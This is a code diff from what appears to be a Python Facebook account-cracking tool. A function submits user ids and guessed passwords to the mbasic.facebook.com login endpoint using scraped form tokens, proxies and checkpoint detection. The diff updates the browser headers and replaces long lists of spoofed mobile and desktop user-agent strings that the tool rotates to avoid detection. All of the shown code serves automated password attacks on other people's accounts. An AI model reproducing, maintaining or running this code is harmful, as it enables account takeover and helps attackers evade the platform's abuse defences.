@@ -324,7 +324,7 @@ def md2(idf,pwv):
       dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
-      heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6','connection': 'close'}
+      heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6','connection': 'close'}
       po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
@@ -417,10 +417,10 @@ def convert(cookie):
 for xd in range(1000):
 	rr = random.randint
 	rc = random.choice
-	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
-	ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; HUAWEI RIO-L01 Build/HuaweiRIO-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
-	ugents3 = f"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/FBIOS;FBBV/12376726;FBDV/iPad2,5;FBMD/iPad;FBSN/iPhone OS;FBSV/7.0.4;FBSS/1; FBCR/;FBID/tablet;FBLC/en_GB;FBOP/1]"
-	ugent4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; J9210 Build/55.2.A.4.229; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
+	ugent1 = f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"
+	ugent2 = f"Mozilla/5.0 (Linux; Android 6.0; CAM-L03 Build/HUAWEICAM-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FBAN/InternetOrgApp;FBAV/75.0.0.0.15;]"
+	ugents3 = f"Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/62.3.3146.57763"
+	ugent4 = f"Mozilla/5.0 (Linux; Android 7.1.2; LIFETAB_P970X Build/NHG47K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Safari/537.36"
 	zaxxy = random.choice([ugent1,ugent2,ugents3,ugent4])
 	ugen.append(zaxxy)
 
@@ -429,16 +429,16 @@ for xd in range(10000):
    rc = random.choice
    win = ["Win64; x64)","WOW64)"]
    samsung = ["SAMSUNG SM-A3560","SAMSUNG SM-R875U","SAMSUNG SM-A356B/A356BXXU1AXBB","SAMSUNG SM-A356E","SAMSUNG SM-E546B","SAMSUNG SM-A155F","SAMSUNG SM-A256B","SAMSUNG SM-A256E"]
-   ugent1 = f"Mozilla/5.0 (Windows NT 10.0; {str(rc(win))} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70,120))}.0.0.0 Safari/537.36"
-   ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,15))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{str(rr(110,130))}.0.{str(rr(3000,5999))}.{str(rr(110,130))} Mobile Safari/537.36"
-   ugent3 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,120))}.0.0.0 Mobile Safari/537.36"
-   ugent4 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) QupZilla/1.9.0 Safari/538.1"
-   ugent5 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Standalone HMD) AppleWebKit/537.36 (KHTML, like Gecko) OculusBrowser/8.5.0.4.24.209184609 SamsungBrowser/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} Mobile VR Safari/537.36"
-   ugent6 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; zh-cn; OPPO R9sk Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} Mobile Safari/537.36 OppoBrowser/10.5.1.2"
-   ugent7 = f"Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; SM-G9550 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} UCBrowser/{str(rr(6,13))}.{str(rr(6,20))}.0.{str(rr(500,1500))} UWS/2.14.0.9 Mobile Safari/537.36 AliApp(TB/7.9.2) UCBS/2.11.1.1 TTID/10004868@taobao_android_7.9.2 WindVane/8.3.0 1080X2076"
-   ugent8 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; en-US; SM-J810F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} UCBrowser/{str(rr(6,13))}.{str(rr(6,20))}.0.{str(rr(500,1500))} Mobile Safari/537.36"
-   ugent9 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; en-US; HRY-LX1MEB Build/HONORHRY-LX1MEB) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} UCBrowser/{str(rr(6,13))}.{str(rr(6,20))}.0.{str(rr(500,1500))} Mobile Safari/537.36"
-   ugent10 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; zh-cn; M2004J19C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.2.150419"
+   ugent1 = f"Mozilla/5.0 (Linux; Android 8.0.0; ZTE BLADE V Ultra Z982) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
+   ugent2 = f"Mozilla/5.0 (Linux; Android 10; SM-N976U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36"
+   ugent3 = f"Mozilla/5.0 (Linux; Android 11; SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 EdgA/95.0.1020.48"
+   ugent4 = f"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52"
+   ugent5 = f"Mozilla/5.0 (Linux; Android 7.0; Infinix X603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
+   ugent6 = f"Mozilla/5.0 (Linux; Android 11; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
+   ugent7 = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36"
+   ugent8 = f"Mozilla/5.0 (Linux; U; Android 7.1.2; en-US; Redmi 4A Build/N2G47H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/12.12.9.1226 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30"
+   ugent9 = f"Mozilla/5.0 (Linux; Android 8.1.0; Lenovo L38043 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+   ugent10 = f"Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36"
    zax = random.choice([ugent1,ugent2,ugent3,ugent4,ugent5,ugent6,ugent7,ugent8,ugent9,ugent10])
    ugen.append(zax)
 def uaku():
